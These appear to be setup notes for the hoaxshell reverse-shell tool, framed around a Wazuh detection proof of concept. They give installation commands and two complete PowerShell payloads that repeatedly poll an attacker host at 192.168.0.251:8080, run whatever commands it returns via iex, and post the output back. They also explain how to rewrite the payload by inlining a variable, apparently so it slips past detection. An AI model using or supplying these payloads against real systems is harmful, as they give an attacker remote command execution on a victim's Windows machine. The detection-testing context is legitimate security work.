#### Installation
```
python3 -m venv hxshell
```
```
cd hxshell
```
```
source bin/activate
```
```
git clone https://github.com/t3l3machus/hoaxshell && cd ./hoaxshell
```
```
pip3 install -r requirements.txt
```
```
chmod +x hoaxshell.py
```
#### Wazuh POC
https://wazuh.com/blog/detecting-hoaxshell-with-wazuh/
Example below of editing payload.  Attacker box is the 192.168.0.251.  Edit a copy of the payload by replacing all mentions of the variable $i with its value declared in the payload, and delete the variable declaration from the payload as shown below.
```
$s='192.168.0.251:8080';$i='a272d586-a50a2f80-21ac44cc';$p='http://';$v=Invoke-WebRequest -UseBasicParsing -Uri $p$s/a272d586 -Headers @{"Authorization"=$i};while ($true){$c=(Invoke-WebRequest -UseBasicParsing -Uri $p$s/a50a2f80 -Headers @{"Authorization"=$i}).Content;if ($c -ne 'None') {$r=iex $c -ErrorAction Stop -ErrorVariable e;$r=Out-String -InputObject $r;$t=Invoke-WebRequest -Uri $p$s/21ac44cc -Method POST -Headers @{"Authorization"=$i} -Body ([System.Text.Encoding]::UTF8.GetBytes($e+$r) -join ' ')} sleep 0.8}
```
```
$s='192.168.0.251:8080';$p='http://';$v=Invoke-WebRequest -UseBasicParsing -Uri $p$s/a272d586 -Headers @{"Authorization"='a272d586-a50a2f80-21ac44cc'};while ($true){$c=(Invoke-WebRequest -UseBasicParsing -Uri $p$s/a50a2f80 -Headers @{"Authorization"='a272d586-a50a2f80-21ac44cc'}).Content;if ($c -ne 'None') {$r=iex $c -ErrorAction Stop -ErrorVariable e;$r=Out-String -InputObject $r;$t=Invoke-WebRequest -Uri $p$s/21ac44cc -Method POST -Headers @{"Authorization"='a272d586-a50a2f80-21ac44cc'} -Body ([System.Text.Encoding]::UTF8.GetBytes($e+$r) -join ' ')} sleep 0.8}
```